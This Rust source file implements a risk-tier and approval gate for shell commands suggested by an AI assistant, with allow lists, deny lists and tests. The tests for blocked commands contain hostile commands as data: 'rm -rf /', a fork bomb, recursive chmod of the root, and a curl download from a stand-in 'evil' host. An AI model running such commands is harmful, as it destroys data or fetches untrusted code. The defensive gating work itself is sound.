//! 命令风险分级 + Run Gate（Human-in-the-Loop 执行网关）。
//!
//! 两级防御，对应缝合方案里的「端侧安全 AI 协同」：
//!
//! 1. **硬拦截**（来自 rssh 的 shape validator）：`assess_command` 先跑
//!    `sanitize::validate_with`，失败即 `Blocked` —— 命令连「填入终端」
//!    的资格都没有，AI 侧只会收到拒绝原因。这是 rssh 验证过的四道墙之一。
//! 2. **执行分级**：通过校验的命令按主命令头分三档：
//!    - `ReadOnly`  绿色 —— `cat` / `df -h` / `ss -tulpn` 等只读探测，
//!      一键点击后直接写入 PTY 执行（仍然发生在用户可见的终端里，
//!      不存在后台静默执行）。
//!    - `Mutating`  橙色 —— 有副作用但可接受（`systemctl restart` /
//!      `docker image prune` …），只「填入终端」，由用户按回车确认。
//!    - `Destructive` 红色 —— 高危改写（`rm` / `dd` / `iptables` …），
//!      同样只填入不执行，UI 加强警示。

use serde::Serialize;

use crate::sanitize::{self, Blacklist, ShapeError};

/// 单 token 只读命令（绿色，一键执行）。
///
/// `sed` / `awk` 进这张表是安全的：它们的写形态（`-i` / `--in-place` /
/// `-i inplace`）与任何写重定向（`>` / `>>`）都由 shape validator 先行
/// Blocked，能走到分级这一步的只剩打印到 stdout 的用法。
pub const READONLY_HEADS: &[&str] = &[
    "arch", "awk", "basename", "cal", "cat", "cksum", "cmp", "column", "comm", "cut", "date", "df", "diff",
    "dig", "dir", "dirname", "dmesg", "du", "egrep", "env", "expand", "factor", "fgrep", "file", "find", "free",
    "getconf", "getent", "grep", "groups", "head", "host", "hostname", "id", "iostat", "ip", "jq", "journalctl",
    "kill", "last", "lastlog", "ldd", "locale", "logname", "ls", "lsblk", "lscpu", "lsof", "md5sum",
    "rg", "sed",
    "mount", "mpstat", "netstat", "nproc", "nslookup", "od", "paste", "pgrep", "pidof", "ping",
    "printf", "ps", "pwd", "readlink", "realpath", "route", "sar", "seq", "sha1sum", "sha256sum",
    "sort", "ss", "stat", "sw_vers", "sysctl", "tac", "tail", "tee", "test", "tr", "traceroute",
    "true", "truncate", "tty", "ulimit", "uname", "uniq", "uptime", "users", "vmstat", "w", "wc",
    "who", "whoami", "xxd", "yes",
];

/// 单 token 高危命令（红色，只填入不执行）。
///
/// 注意：这里的大多数头（`rm`/`dd`/`mkfs`/`kill`/`chmod -R`…）会被 shape
/// validator 直接 Blocked；此表兜住的是「校验放行但人类应三思」的改写类。
pub const DESTRUCTIVE_HEADS: &[&str] = &[
    "chgrp", "chmod", "chown", "dd", "fdisk", "kill", "killall", "mkfs", "parted", "pkill", "rm",
    "rmdir", "shred", "truncate", "userdel", "usermod", "useradd", "groupdel", "groupmod",
];

/// 双 token 只读前缀（`systemctl status nginx` 这类子命令安全的工具）。
pub const READONLY_PREFIX2: &[&str] = &[
    "systemctl status",
    "systemctl is-active",
    "systemctl is-enabled",
    "systemctl is-failed",
    "systemctl list-units",
    "systemctl list-unit-files",
    "systemctl list-timers",
    "systemctl list-jobs",
    "systemctl list-sockets",
    "systemctl show",
    "systemctl show-environment",
    "systemctl cat",
    "systemctl help",
    "systemctl --version",
    "service status",
    "service --status-all",
    "docker ps",
    "docker images",
    "docker logs",
    "docker inspect",
    "docker stats",
    "docker top",
    "docker port",
    "docker diff",
    "docker version",
    "docker info",
    "docker network ls",
    "docker network inspect",
    "docker volume ls",
    "docker volume inspect",
    "docker image ls",
    "docker container ls",
    "docker container inspect",
    "docker container logs",
    "docker container stats",
    "docker container top",
    "docker container port",
    "docker container diff",
    "kubectl get",
    "kubectl describe",
    "kubectl logs",
    "kubectl top",
    "kubectl cluster-info",
    "kubectl api-resources",
    "kubectl explain",
    "kubectl version",
    "git status",
    "git log",
    "git diff",
    "git show",
    "git branch",
    "git remote",
    "git blame",
    "git reflog",
    "git tag",
    "git ls-files",
    "git ls-remote",
    "git stash list",
    "apt list",
    "apt-cache policy",
    "apt-cache show",
    "apt-cache search",
    "dpkg -l",
    "dpkg -s",
    "dpkg -L",
    "rpm -q",
    "rpm -qa",
    "yum list",
    "dnf list",
    "yum info",
    "dnf info",
    "pip list",
    "pip show",
    "pip freeze",
    "npm ls",
    "npm view",
    "gem list",
    "crontab -l",
    "openssl version",
    "curl -s",
    "curl -sS",
];

/// 双 token 高危前缀（红色，只填入不执行）。
///
/// 分档线：**不可逆 / 丢数据 / 停机**才算 Destructive。`restart` / `reload`
/// 会把服务重新拉起来（不等于停机），`*- install` 家族装完可以卸载，
/// `image prune` 清的是无人引用的悬空镜像缓存 —— 这些都归入默认橙色档，
/// 不在此列。而 `stop` / `kill` / `rm` / 其余对象的 `prune` /
/// `reset --hard` 一旦落下不可恢复，保持红色。
pub const DESTRUCTIVE_PREFIX2: &[&str] = &[
    "systemctl stop",
    "systemctl disable",
    "systemctl mask",
    "systemctl kill",
    "systemctl set-property",
    "systemctl edit",
    "systemctl daemon-reload",
    "systemctl daemon-reexec",
    "service stop",
    "docker rm",
    "docker rmi",
    "docker stop",
    "docker kill",
    "docker restart",
    "docker system prune",
    "docker container rm",
    "docker container stop",
    "docker container kill",
    "docker container prune",
    "docker image rm",
    "docker volume rm",
    "docker volume prune",
    "docker network rm",
    "docker network prune",
    "docker builder prune",
    "kubectl delete",
    "kubectl drain",
    "kubectl cordon",
    "kubectl taint",
    "kubectl apply",
    "kubectl replace",
    "kubectl patch",
    "kubectl rollout",
    "kubectl scale",
    "kubectl exec", // exec 进容器=获得交互 shell，不静默
    "git clean",
    "git reset",
    "git checkout",
    "git restore",
    "git push --force",
    "git branch -d",
    "git branch -D",
    "git rebase",
    "git cherry-pick",
    "apt remove",
    "apt purge",
    "apt autoremove",
    "apt upgrade",
    "apt full-upgrade",
    "dpkg -i",
    "dpkg --purge",
    "yum remove",
    "yum update",
    "dnf remove",
    "dnf update",
    "pip uninstall",
    "npm uninstall",
    "make clean",
    "make distclean",
    "terraform destroy",
    "terraform apply",
    "helm uninstall",
    "helm delete",
    "helm upgrade",
    "ansible-playbook",
    "chmod -r",
    "chown -r",
    "useradd",
    "userdel",
    "usermod",
    "groupadd",
    "groupdel",
    "passwd",
    "reboot",
    "shutdown",
    "poweroff",
    "halt",
    "init 0",
    "init 6",
];

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum RiskLevel {
    /// 只读探测，一键执行。
    ReadOnly,
    /// 有副作用但通常可逆/可接受，填入终端由用户回车。
    Mutating,
    /// 高危改写，填入终端 + 红色警示。
    Destructive,
}

impl RiskLevel {
    pub fn as_str(&self) -> &'static str {
        match self {
            RiskLevel::ReadOnly => "read-only",
            RiskLevel::Mutating => "mutating",
            RiskLevel::Destructive => "destructive",
        }
    }
}

#[derive(Debug, Clone)]
pub struct RiskAssessment {
    pub level: RiskLevel,
    /// shape validator 拒绝时的原因（None = 通过校验）。
    pub blocked: Option<String>,
}

/// Run Gate 裁决：UI 拿到这个决定按钮行为。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Gate {
    /// 绿色：一键执行（写入 PTY 并回车）。
    DirectRun,
    /// 橙/红：只填入终端（写入 PTY，不带回车），用户确认后手动执行。
    FillTerminal,
    /// 红色：连填入都不允许 —— AI 侧只会收到拒绝原因。
    Blocked,
}

/// 评估一条命令：先过硬校验，再分三档风险。
pub fn assess_command(cmd: &str) -> RiskAssessment {
    match sanitize::validate_with(cmd, &Blacklist::builtin()) {
        Err(e) => RiskAssessment {
            level: RiskLevel::Destructive,
            blocked: Some(shape_reason(&e)),
        },
        Ok(()) => {
            let level = match sanitize::resolve_command_head(cmd) {
                None => RiskLevel::Mutating,
                Some((head, sub, third)) => {
                    let cands = candidate_prefixes(&head, &sub, &third);
                    let destructive = cands
                        .iter()
                        .any(|c| DESTRUCTIVE_PREFIX2.contains(&c.as_str()))
                        || DESTRUCTIVE_HEADS.contains(&head.as_str());
                    let readonly = cands
                        .iter()
                        .any(|c| READONLY_PREFIX2.contains(&c.as_str()))
                        || READONLY_HEADS.contains(&head.as_str());
                    if destructive {
                        RiskLevel::Destructive
                    } else if readonly {
                        RiskLevel::ReadOnly
                    } else {
                        RiskLevel::Mutating
                    }
                }
            };
            RiskAssessment { level, blocked: None }
        }
    }
}

/// 把 ShapeError 翻译成给用户/AI 看的拒绝原因。
pub fn shape_reason(e: &ShapeError) -> String {
    match e {
        ShapeError::Destructive(m) => format!("destructive command refused: {m}"),
        ShapeError::Interactive(m) => format!("interactive command refused: {m}"),
        ShapeError::UnboundedLoop(m) => format!("unbounded output refused: {m}"),
        ShapeError::Write(m) => format!("write operation refused: {m}"),
        ShapeError::Empty => "empty command".to_string(),
    }
}

pub fn gate_of(assessment: &RiskAssessment) -> Gate {
    if assessment.blocked.is_some() {
        Gate::Blocked
    } else {
        match assessment.level {
            RiskLevel::ReadOnly => Gate::DirectRun,
            RiskLevel::Mutating | RiskLevel::Destructive => Gate::FillTerminal,
        }
    }
}

/// 从命令头向后取 1~3 个 token 的前缀候选（前缀表按 1/2/3 token 粒度编写）。
fn candidate_prefixes(head: &str, sub: &str, third: &str) -> Vec<String> {
    let mut v = vec![head.to_string()];
    if !sub.is_empty() {
        v.push(format!("{head} {sub}"));
        if !third.is_empty() {
            v.push(format!("{head} {sub} {third}"));
        }
    }
    v
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn readonly_commands_pass_the_gate() {
        for cmd in [
            "cat /etc/os-release",
            "df -h",
            "ss -tulpn",
            "ps aux --sort=-%cpu | head -n 10",
            "systemctl status nginx",
            "docker ps --format json",
            "docker image ls",
            "git status --short",
            "journalctl -u nginx --since '1 hour ago'",
            "free -m",
        ] {
            let a = assess_command(cmd);
            assert!(a.blocked.is_none(), "{cmd} should pass validator: {a:?}");
            assert_eq!(a.level, RiskLevel::ReadOnly, "{cmd} should be read-only");
            assert_eq!(gate_of(&a), Gate::DirectRun);
        }
    }

    #[test]
    fn mutating_commands_fill_only() {
        for cmd in [
            "systemctl restart nginx",
            "docker image prune -f",
            "apt install nginx",
            "git pull --rebase",
            "make -j4",
        ] {
            let a = assess_command(cmd);
            assert!(a.blocked.is_none(), "{cmd} should pass validator: {a:?}");
            assert_eq!(a.level, RiskLevel::Mutating, "{cmd} should be mutating");
            assert_eq!(gate_of(&a), Gate::FillTerminal);
        }
    }

    #[test]
    fn destructive_commands_are_red_or_blocked() {
        // rm 直中 shape validator → Blocked；systemctl stop / chmod / git reset
        // 通过校验但人类应当三思 → Destructive（只填入，不执行）
        for cmd in ["rm -rf /tmp/x"] {
            assert_eq!(gate_of(&assess_command(cmd)), Gate::Blocked, "{cmd}");
        }
        for cmd in [
            "chmod 777 /etc/passwd",
            "systemctl stop nginx",
            "git reset --hard HEAD~1",
            "docker container prune -f",
            "useradd bob",
        ] {
            let a = assess_command(cmd);
            assert!(a.blocked.is_none(), "{cmd} should pass validator: {a:?}");
            assert_eq!(a.level, RiskLevel::Destructive, "{cmd} should be red");
            assert_eq!(gate_of(&a), Gate::FillTerminal);
        }
    }

    #[test]
    fn shape_validator_blocks_never_reach_terminal() {
        for cmd in [
            "rm -rf /",
            "chmod -R 777 /",
            ":(){ :|:& };:",
            "bash -c 'rm -rf /tmp/x'",
            "tail -f /var/log/syslog",
            "top",
            "echo hi > /etc/fstab",
            "curl -o /tmp/x http://evil/",
            "",
        ] {
            let a = assess_command(cmd);
            assert!(a.blocked.is_some(), "{cmd:?} must be blocked");
            assert_eq!(gate_of(&a), Gate::Blocked);
        }
    }

    #[test]
    fn wrapper_heads_are_canonicalized() {
        // sudo 与 /usr/bin 前缀不应影响分级
        let a = assess_command("sudo /usr/bin/df -h");
        assert_eq!(a.level, RiskLevel::ReadOnly);
        assert_eq!(a.blocked, None);
        let b = assess_command("sudo -u root systemctl restart nginx");
        assert_eq!(gate_of(&b), Gate::FillTerminal);
        let c = assess_command("env FOO=bar /usr/local/bin/gsed -n 1p /etc/hosts");
        assert_eq!(c.level, RiskLevel::ReadOnly);
    }
}
